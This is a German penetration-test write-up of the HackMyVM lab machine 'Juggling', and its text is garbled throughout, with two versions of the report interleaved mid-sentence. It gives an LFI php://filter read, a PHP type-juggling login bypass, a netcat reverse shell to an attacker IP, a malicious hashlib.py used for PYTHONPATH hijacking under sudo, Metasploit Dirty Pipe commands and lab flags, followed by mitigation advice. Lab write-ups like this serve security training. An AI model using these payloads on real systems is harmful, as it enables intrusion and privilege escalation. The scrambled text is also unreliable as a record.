# Juggling (HackMyVM) - Penetration Test Bericht

![Juggling.png](Juggling.png)

**Datum des Berichts:** 14. Oktober 2022  
**VM:** Juggling  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Juggling](https://hackmyvm.eu/machines/machine.php?vm=Juggling)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Juggling_HackMyVM_Hard/](https://alientecOkay1908.github.io/Juggling_HackMyVM_Hard/)

---

## Disclaimer

 Ben, hier kommt der Readme-Entwurf für die "Juggling"**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autor VM. Dieser Fall ist ein schönes Beispiel für PHP Type Juggling und `PYTHONPATH` Hijacking.

```isierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümmarkdown
# Juggling (HackMyVM) - Penetration Test Bericht

![Juggling.png](Jugglingers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der.png)

**Datum des Berichts:** 14. Oktober 2022  
**VM Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbew:** Juggling  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machineusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammen.php?vm=Juggling](https://hackmyvm.eu/machines/machine.php?vm=fassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [PhaseJuggling)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Juggling_HackMyVM_Hard/](https://alient 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration,ec1908.github.io/Juggling_HackMyVM_Hard/)

---

## Disclaimer LFI & PHP Logic Bypass](#phase-2-web-enumeration-lfi--php-logic-bypass)
5

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwe.  [Phase 3: Initial Access (RCE via Hidden VHost)](#phase-3-initial-cken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen undaccess-rce-via-hidden-vhost)
6.  [Phase 4: Privilege Escalation autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigent (Kette)](#phase-4-privilege-escalation-kette)
    *   [www-ümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt.data zu rehan (Sudo/PYTHONPATH Hijacking)](#www-data-zu-rehan-sud Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsopythonpath-hijacking)
    *   [rehan zu root (Dirty Pipe Kernel Exploit)](#bewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zrehan-zu-root-dirty-pipe-kernel-exploit)
7.  [Proof of Conceptusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [ (PYTHONPATH Hijacking)](#proof-of-concept-pythonpath-hijacking)
8.  [Flags](#Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Webflags)
9.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen- Enumeration, LFI & PHP Logic Bypass](#phase-2-web-enumeration-lfi--php-logic-bypass)
5.  [Phase 3: Initial Access (RCE via Hidden VHost)](#phase-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Juggling" von HackMyVM (Schwierigkeitsgrad: Hard). Die initiale Erkundung offenbarte offene3-initial-access-rce-via-hidden-vhost)
6.  [Phase 4 SSH- und HTTP-Dienste (Nginx). Eine Local File Inclusion (LFI)-Schwachstelle in `: Privilege Escalation (Kette)](#phase-4-privilege-escalation-kette)
    *   [www-data zu rehan (Sudo/PYTHONPATH Hijacking)](#www-data-zu-rehanblog.php` (Parameter `page`) ermöglichte das Auslesen des Quellcodes von `index.php`. Die-sudopythonpath-hijacking)
    *   [rehan zu root (Dirty Pipe Kernel Exploit)](# Analyse von `index.php` enthüllte eine PHP Type Juggling Schwachstelle in der Login-Logik undrehan-zu-root-dirty-pipe-kernel-exploit)
7.  [Proof of Concept Hinweise auf einen versteckten VHost (`s3cur3.juggling.hmv`). Durch Ausnutzung der (PYTHONPATH Hijacking)](#proof-of-concept-pythonpath-hijacking)
8.  [Flags](# Type Juggling Schwachstelle (mit `username=QNKCD`, `password=Z`, `val1[]=aflags)
9.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "`, `val2[]=A`) wurde die Login-Prüfung umgangen. Dies ermöglichte, in Kombination mit demJuggling" von HackMyVM (Schwierigkeitsgrad: Hard). Die initiale Erkundung offenbarte offene SSH Session-Cookie, den Zugriff auf den VHost `s3cur3.juggling.hmv`. Dieser VHost war- und HTTP-Dienste (nginx). Die Web-Enumeration von `blog.php` führte zur Entdeckung einer Local File Inclusion (LFI)-Schwachstelle. Durch Auslesen des Quellcodes von `index.php anfällig für Remote Code Execution (RCE) über einen POST-Parameter `system`, was zu einer Reverse Shell als Benutzer `www-data` führte.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  ` wurde eine komplexe PHP-Typvergleichsschwäche (Type Juggling) im Login-Mechanismus identifiziert**www-data zu rehan:** `www-data` durfte ein Python-Skript (`/opt/md. Diese erlaubte das Umgehen der Authentifizierung durch Senden von Array-Parametern und spezifischen Username/Passwort-5.py`) via `sudo` als Benutzer `rehan` ausführen, wobei die `SETENV`-Option aktivKombinationen (`QNKCD:Z`). Der erfolgreiche Bypass leitete zu einem internen Pfad (` war. Dies ermöglichte PYTHONPATH Hijacking. Durch Erstellen eines bösartigen `hashlib.py`-Moduls wurde../s3cur3/index.php`) weiter, der auf einen VHost `s3cur3.juggling.hm eine Shell als `rehan` erlangt.
2.  **rehan zu root:** Das System warv` hindeutete. Dieser VHost war anfällig für Remote Code Execution (RCE) über einen POST-Parameter `system`, was zu einer Reverse Shell als `www-data` führte.

Die Privilegieneskalation erfolgte in zwei anfällig für den Dirty Pipe Kernel Exploit (CVE-2022-0847). Mittels Metasplo Schritten:
1.  **www-data zu rehan:** `www-data` durfte ein Python-Skriptit wurde dieser Exploit erfolgreich gegen den Kernel (Version 5.10.0) eingesetzt, um eine Root-Shell zu erhalten.

---

## Verwendete Tools

*   `arp-scan`
*    (`/opt/md5.py`) via `sudo` als Benutzer `rehan` ausführen, wobei die `SETENV`vi` (impliziert für Hosts-Datei und Skriptbearbeitung)
*   `nmap`
*   ``-Option aktiv war. Dies ermöglichte `PYTHONPATH`-Hijacking. Durch Erstellen eines bösartigen `hashlib.pygobuster`
*   `Browser` (Firefox)
*   `base64`
*   `Cyber`-Moduls (das von `/opt/md5.py` importiert wurde) konnte eine Shell als `rehanChef` (external, für Dekodierung und Payload-Erstellung)
*   `Burp Suite` (für Request-Manipulation)
*   `nc (netcat)`
*   `python3` (`pty.spawn`,` erlangt werden.
2.  **rehan zu root:** Der Kernel des Systems (Version 5.1 `http.server`)
*   `stty` (für Shell-Stabilisierung)
*   `sudo0.0) war anfällig für den Dirty Pipe Exploit (CVE-2022-0847). Dieser wurde mittels Metasploit ausgenutzt, um Root-Rechte zu erlangen.

---

## Ver`
*   `ls`, `cd`, `wget`, `chmod`, `mkdir` (implizit), `id`, `cat`, `echo`
*   `msfconsole` (Metasploit Framework)
    wendete Tools

*   `arp-scan`
*   `vi` (impliziert für Hosts-Datei*   `local_exploit_suggester` Modul
    *   `exploit/linux/local)
*   `nmap`
*   `gobuster`
*   Browser (Firefox, für Inter/cve_2022_0847_dirtypipe` Modul

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   `aktion und Inspektion)
*   `base64`
*   `CyberChef` (external, für Base64arp-scan -l` identifizierte das Ziel `192.168.2.14-Dekodierung)
*   `Burp Suite` (für Request-Manipulation)
*   `nc8` (VirtualBox VM).
    *   Der Hostname `juggling.hmv` wurde der lokalen (netcat)`
*   `python3` (`pty.spawn`, `http.server` für Payload-Transfer `/etc/hosts`-Datei hinzugefügt.

2.  **Port-Scan (Nmap):**
)
*   `stty` (für Shell-Stabilisierung)
*   `sudo`
*       *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -`ls`, `cd`, `wget`, `chmod`, `mkdir` (implizit)
*   `msfconsolesV -A 192.168.2.148 -p-`) offenbarte`, `Metasploit (local_exploit_suggester, cve_2022_:
        *   **Port 22 (SSH):** OpenSSH 8.4p1 Debian
0847_dirtypipe)`
*   `id`, `cat`

---

## Phase 1        *   **Port 80 (HTTP):** nginx 1.18.0 (Seitentitel: Reconnaissance

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.14: "Juggling"). Das HttpOnly-Flag für PHPSESSID war nicht gesetzt.

---

## Phase 2: Web Enumeration, LFI & PHP Logic Bypass

1.  **Web-Enumeration:**
    *   8` (VirtualBox VM).
    *   Der Hostname `juggling.hmv` wurde der lokalen`gobuster dir` fand `admin.php`, `blog.php`, `index.php`, `logout.php`, ` `/etc/hosts`-Datei hinzugefügt.

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -test.php`.
    *   Auf `http://juggling.hmv/blog.php` wurde eine Local FilesV -A 192.168.2.148 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 8.4p1 Debian
 Inclusion (LFI)-Schwachstelle im Parameter `page` identifiziert.

2.  **Quellcode-An        *   **Port 80 (HTTP):** nginx 1.18.0 (Seitentitel:alyse via LFI:**
    *   Mittels LFI und PHP-Filtern (`php://filter/read= "Juggling"). Das PHPSESSID-Cookie hatte kein `HttpOnly`-Flag.

---

## Phase 2convert.base64-encode/resource=index`) wurde der Base64-kodierte Quellcode von `index.: Web Enumeration, LFI & PHP Logic Bypass

1.  **Web-Enumeration (`gobuster`):php` ausgelesen.
    *   Die Analyse des dekodierten `index.php`-Codes ergab:**
    *   Fand `admin.php`, `blog.php`, `index.php`, `logout
        *   Eine PHP Type Juggling Schwachstelle in der Login-Logik. Die Bedingung `$key == number_.php`, `test.php`.

2.  **Local File Inclusion (LFI) in `blog.php`format($magicval * 1337)` konnte durch Übergabe von Arrays für `val1` und `val2:**
    *   Die Seite `blog.php` war anfällig für LFI über den `page`-Parameter.` (was `$magicval` zu `null` macht) und einem MD5-Hash für `$username.$password`,
    *   Der Quellcode von `index.php` wurde mittels LFI und Base64-Kod der von PHP als `0` interpretiert wird, umgangen werden.
        *   Auskommentierte Headerierung ausgelesen:
        ```
        http://juggling.hmv/blog.php?page=php-Zeilen, die auf einen VHost `s3cur3.juggling.hmv` und einen Pfad `../://filter/read=convert.base64-encode/resource=index
        ```

3.  **Analyse von `index.php` (PHP Type Juggling):**
    *   Der dekodierte Quells3cur3/index.php` hinwiesen.
    *   Der VHost `s3cur3.code von `index.php` zeigte eine komplexe Authentifizierungslogik.
    *   **Schwachstelle:**juggling.hmv` wurde der `/etc/hosts`-Datei hinzugefügt. `gobuster` auf diesem V Eine Kombination aus `strcasecmp()` mit potenziellen Array-Eingaben (`$val1`, `$val2`) undHost fand eine `index.php`, die zur Hauptseite weiterleitete.

3.  **Login-Bypass:**
    *   Ein POST-Request an `http://juggling.hmv/index.php` mit den einem losen Vergleich (`==`) des MD5-Hashes von Username/Passwort mit `number_format($ Werten `username=QNKCD`, `password=Z`, `val1[]=a`, `val2[]=A`magicval * 1337)`.
    *   Durch Senden von `val1` und `val2` als Arrays (z.B. `val1[]=a`, `val2[]=A`) wird `$ umging die Login-Logik erfolgreich und setzte ein gültiges `PHPSESSID`-Cookie.

---

## Phasemagicval = strcasecmp(array, array)` zu `null`.
    *   Die Bedingung `md 3: Initial Access (RCE via Hidden VHost)

1.  **RCE auf VHost `s5($username.$password) == number_format(null * 1337)` wird zu `md5($username.$3cur3.juggling.hmv`:**
    *   Es wurde (vermutlich durch LFI aufpassword) == "0"`.
    *   Diese Bedingung ist wahr, wenn der MD5-Hash von `s3cur3/index.php`, Details im Log unklar) festgestellt, dass die `index.php` auf PHP als `0` interpretiert wird (z.B. wenn er nicht numerisch beginnt oder ein "Magic Hash" dem VHost `s3cur3.juggling.hmv` einen POST-Parameter `system` unsicher als wie `0e...` ist).
    *   Die Zugangsdaten `username=QNKCD` und `password=Z` (MD5-Hash: `0e83...`) erfüllten diese Bedingung.
    * Betriebssystembefehl ausführt.
    *   Mit dem gültigen `PHPSESSID`-Cookie vom Login-Bypass wurde ein POST-Request an `http://s3cur3.juggling.hmv/index.php`   Auskommentierte `header`-Zeilen im Code von `index.php` enthielten Hinweise auf den VHost `s3cur3.juggling.hmv` und den Pfad `../s3cur3/index. gesendet.
    *   Der POST-Body enthielt den Parameter `system=` mit einer URL-kodierten Netphp`.

4.  **VHost Discovery und Analyse:**
    *   `192.168.2cat-Reverse-Shell-Payload:
        ```
        system=nc%20-e%20.148 s3cur3.juggling.hmv` wurde zu `/etc/hosts` hinzugefügt./bin/bash%20[Angreifer-IP]%204444
        ```

    *   `gobuster dir` auf `http://s3cur3.juggling.hmv`2.  **Empfang der Shell:**
    *   Ein `nc -lvnp 4444` auf dem Angreifer-System empfing die Verbindung.
    *   Initialer Zugriff als `www-data` fand eine `index.php`, die zurück zu `juggling.hmv` weiterleitete.
    * wurde erlangt und die Shell stabilisiert.

---

## Phase 4: Privilege Escalation (Kette)   Mittels LFI auf `blog.php` wurde der Quellcode von `../s3cur3/index.php

### www-data zu rehan (Sudo/PYTHONPATH Hijacking)

1.  **Sudo-Rechte` ausgelesen (Inhalt im Log nicht explizit gezeigt, aber für den nächsten Schritt notwendig).

---

-Prüfung für `www-data`:**
    *   `www-data@juggling:~/## Phase 3: Initial Access (RCE via Hidden VHost)

1.  **Login-Bypass unds3cur3$ sudo -l` zeigte:
        ```
        User www-data may run the following commands on juggling:
            (rehan) SETENV: NOPASSWD: /opt/md5.py
         Session-Erhalt:**
    *   Ein POST-Request an `http://juggling.hmv/index.php` mit `username=QNKCD`, `password=Z`, `val1[]=a`, `val```
    *   `www-data` durfte `/opt/md5.py` als `rehan` ohne Passwort ausführen, und die `SETENV`-Option war aktiv.

2.  **PYTHONPATH Hijacking:**
    *   2[]=A` umging den Login und setzte ein gültiges `PHPSESSID`-Cookie.

2.  **Remote Code Execution (RCE) auf `s3cur3.juggling.hmv`:**
    *Es wurde angenommen, dass `/opt/md5.py` das Modul `hashlib` importiert.
   Ein POST-Request wurde an `http://s3cur3.juggling.hmv/index.php    *   Eine bösartige `hashlib.py`-Datei wurde in `/tmp/test/` auf dem Zielsystem erstellt` (oder `/`) gesendet, unter Mitführung des gültigen `PHPSESSID`-Cookies.
    *:
        ```python
        # /tmp/test/hashlib.py
        import os
        def   Der POST-Body enthielt den Parameter `system=[REVERSE_SHELL_PAYLOAD]`.
        ``` md5(test): # md5 wird von /opt/md5.py aufgerufen
            os.system("/bash
        # Angreifer-Listener:
        # nc -lvnp 4444
        #bin/bash -i") 
            # ... (Rest, um das Originalverhalten zu imitieren)
             Burp Suite Request (POST-Body URL-kodiert):
        # system=nc%20-e%20/bin/bash%20[Angreifer-IP]%204444
        ```
return # ...
        ```
    *   Der Sudo-Befehl wurde mit manipuliertem `PYTHONPATH` ausgeführt:
        ```bash
        sudo -u rehan PYTHONPATH=/tmp/test /opt/md5.    *   Initialer Zugriff als `www-data` wurde erlangt und die Shell stabilisiert.

---

## Phase 4: Privilege Escalation (Kette)

### www-data zu rehan (Sudo/PYTHONPATH Hijpy
        ```
    *   Dies startete eine interaktive Shell als Benutzer `rehan`.
    *acking)

1.  **Sudo-Rechte-Prüfung für `www-data`:**
    *      Die User-Flag `de0a7d9cb0e1ae6190e85549f63a26c1` wurde in `/home/rehan/user.txt` gefunden.

###`www-data@juggling:~/s3cur3$ sudo -l` zeigte:
        ```
        User www-data may run the following commands on juggling:
            (rehan) SETENV: NOP rehan zu root (Dirty Pipe Kernel Exploit)

1.  **Sudo-Rechte-Prüfung für `rehan`:**
    *   `sudo -l` (als `rehan`) erforderte ein Passwort (ASSWD: /opt/md5.py
        ```
    *   `www-data` durfte `/opt/md5.py` als `rehan` ohne Passwort ausführen, und die `SETENV`-Option war aktiv.

2nicht bekannt).

2.  **Kernel Exploit (Dirty Pipe CVE-2022-0847.  **Vorbereitung des `PYTHONPATH`-Hijackings:**
    *   Es wurde angenommen, dass `/):**
    *   Eine bestehende Shell-Session als `rehan` wurde in Metasploit alsopt/md5.py` das Modul `hashlib` importiert.
    *   Eine bösartige Datei Session 2 importiert/genutzt.
    *   Der `local_exploit_suggester` ( `hashlib.py` wurde im Verzeichnis `/tmp/test/` auf dem Zielsystem erstellt (transferiert von der Angreifer-Maschine):
        ```python
        # /tmp/test/hashlib.py
vermutlich zuvor ausgeführt) wies auf die Dirty Pipe-Schwachstelle hin (Kernel-Version 5.        import os
        class Test(object):
            def __init__(self,test):
                self.test = test10.0 war anfällig).
    *   Das Metasploit-Modul `exploit/linux/
            def hexdigest(self):
                return self.test
        def md5(test): #local/cve_2022_0847_dirtypipe` wurde verwendet:
        ``` Diese Funktion wird von /opt/md5.py aufgerufen
            os.system("/bin/bash -i")
        msf6 > use exploit/linux/local/cve_2022_0847_ # Startet eine Shell
            return Test(test) # Immitiert originales Verhalten
        ```

3.  **dirtypipe
        msf6 exploit(...) > set session 2
        msf6 exploit(...) > set WRAusnutzung:**
    *   `sudo -u rehan PYTHONPATH=/tmp/test /opt/md5.py`ITABLE_DIR /tmp
        msf6 exploit(...) > set lhost [Angreifer-IP]
        
    *   Dies führte die bösartige `hashlib.py` aus und gewährte eine Shell als Benutzermsf6 exploit(...) > set lport 4444
        msf6 exploit(...) > run
        ```
    *   Der Exploit war erfolgreich und öffnete eine neue Meterpreter-Session (Session 3) `rehan`.
    *   Die User-Flag `de0a7d9cb0e1ae6190e85549f63a26c1` wurde in `/home/rehan/ mit Root-Rechten.
    *   Über `shell` in Meterpreter wurde eine Root-System-Shell erhalten.

---

## Proof of Concept (PYTHONPATH Hijacking)

**Kurzbeschreibung:** Der Benutzer `wwwuser.txt` gefunden.

### rehan zu root (Dirty Pipe Kernel Exploit)

1.  **Enumeration als `rehan`:**
    *   `sudo -l` für `rehan` erforderte ein Passwort (-data` konnte ein Python-Skript (`/opt/md5.py`) als `rehan` mittelsnicht bekannt).
    *   Die Kernel-Version (implizit aus `uname -a` oder Metasploit- `sudo` ausführen, wobei die `SETENV`-Option die Manipulation von Umgebungsvariablen erlaubte. DasCheck) war `5.10.0`, anfällig für Dirty Pipe (CVE-2022-084 Skript `/opt/md5.py` importierte das Standardmodul `hashlib`. Durch Setzen von7).

2.  **Ausnutzung mit Metasploit:**
    *   Eine bestehende Shell `PYTHONPATH` auf ein kontrolliertes Verzeichnis (`/tmp/test`), in dem eine bösartige `hash/Meterpreter-Session als `rehan` (Session 2) wurde verwendet.
    *   Das Metasploit-Modul `exploit/linux/local/cve_2022_08lib.py` platziert wurde, konnte der Importmechanismus gekapert und Code als `rehan` ausgeführt werden.

**Schritte (als `www-data`):**
1.  Erstelle ein Verzeichnis für die bösartige47_dirtypipe` wurde konfiguriert und ausgeführt.
        ```
        msf6 exploit(linux/local Bibliothek: `mkdir /tmp/test`.
2.  Erstelle die bösartige `hashlib.py/cve_2022_0847_dirtypipe) > set session 2
        ` in `/tmp/test/` mit einer Funktion, die eine Shell startet (siehe oben).
3.  Fühmsf6 exploit(linux/local/cve_2022_0847_dirtypipere den `sudo`-Befehl mit manipuliertem `PYTHONPATH` aus:
    ```bash
    ) > set WRITABLE_DIR /tmp
        msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set lhost [Angreifer-IP]
        sudo -u rehan PYTHONPATH=/tmp/test /opt/md5.py
    ```
**Ergebnismsf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set lport 4444
        msf6 exploit(linux/local/cve_:** Eine interaktive Shell als Benutzer `rehan` wird gestartet.

---

## Flags

*   **User Flag (`/home/rehan/user.txt`):**
    ```
    de0a7d92022_0847_dirtypipe) > run
        ```
    *   Der Exploit war erfolgreichcb0e1ae6190e85549f63a26c1
 und öffnete eine neue Meterpreter-Session (Session 3) mit Root-Rechten.
    *   Mitt    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    5401cd51a7ec8ddde279066ef17a28b7
els `shell` und `id` wurde `uid=0(root)` bestätigt.

---

## Proof of Concept (PYTHONPATH Hijacking)

**Kurzbeschreibung:** Die Eskalation von `www-data` zu `rehan    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webanwendungssicherheit (L` nutzte eine `sudo`-Regel, die `www-data` erlaubte, ein Python-SkriptFI & Type Juggling):**
    *   **DRINGEND:** Beheben Sie die LFI-Schwachstelle in (`/opt/md5.py`) als `rehan` mit der `SETENV`-Option auszuführen. `blog.php` durch strikte Validierung des `page`-Parameters (Whitelist-Ansatz).
    *   **DR Das Skript `/opt/md5.py` importierte das Standardmodul `hashlib`. Durch Setzen derINGEND:** Korrigieren Sie die PHP Type Juggling Schwachstelle in `index.php`. Verwenden Sie stri `PYTHONPATH`-Umgebungsvariable auf ein kontrolliertes Verzeichnis (z.B. `/tmp/testkte Vergleiche (`===`), validieren Sie Eingabetypen und verwenden Sie sichere Passwort-Hashing-Methoden.
*`), in dem eine bösartige `hashlib.py` platziert wurde, konnte der Importmechanismus von Python gekapert   **RCE auf VHost:**
    *   **DRINGEND:** Beheben Sie die RCE-Schwach werden. Die bösartige Bibliothek führte beim Aufruf Code aus, der eine Shell als `rehan` startete.

stelle auf `s3cur3.juggling.hmv` (Parameter `system`). Führen Sie niemals Benutz**Schritte (als `www-data`):**
1.  Erstelle ein Verzeichnis für die bösartigeereingaben direkt als Systembefehle aus. Verwenden Sie sichere Alternativen oder strikte Eingabevalidierung/- Bibliothek, z.B. `mkdir /tmp/test`.
2.  Erstelle die bösartige `hashsanitisierung.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Entferlib.py` in `/tmp/test/` (Inhalt siehe oben).
3.  Führe den `sudo`-Befehl mit manipuliertem `PYTHONPATH` aus:
    ```bash
    sudo -nen Sie die `SETENV`-Option aus der `sudo`-Regel für `www-data`, die `/opt/md5u rehan PYTHONPATH=/tmp/test /opt/md5.py
    ```
**Ergebnis:** Eine interaktive Shell als Benutzer `rehan` wird gestartet.

---

## Flags

*   **User Flag.py` betrifft. Wenn `SETENV` notwendig ist, beschränken Sie die erlaubten Variablen streng.
    *   Überprüfen Sie die Notwendigkeit und Sicherheit von Skripten, die über `sudo` ausgeführt werden dürfen (`/home/rehan/user.txt`):**
    ```
    de0a7d9.
*   **Kernel-Sicherheit:**
    *   **DRINGEND:** Patchen Sie den Linuxcb0e1ae6190e85549f63a26c1
-Kernel, um die Dirty Pipe-Schwachstelle (CVE-2022-0847) und    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    5401cd51a7ec8ddde279066ef17a28b7
 andere bekannte Schwachstellen zu schließen. Halten Sie das System und alle Komponenten stets auf dem neuesten Stand.
*       ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **PHP Type Juggling &**Allgemeine Sicherheitspraktiken:**
    *   Setzen Sie das `HttpOnly`-Flag für Session-Cookies Logikfehler:**
    *   **DRINGEND:** Beheben Sie die Typvergleichsschwäche in `.
    *   Entfernen Sie unnötige Test- oder Debug-Dateien (`test.php`,index.php`. Verwenden Sie strikte Vergleiche (`===`) und validieren Sie Eingabetypen sorgfältig `blog.php` falls nicht produktiv genutzt).
    *   Überprüfen Sie die Konfiguration von V, um Array-Injection und Type Juggling zu verhindern.
    *   Verwenden Sie sicherere Passwort-Hashing-AlgHosts sorgfältig.

---

**Ben C. - Cyber Security Reports**
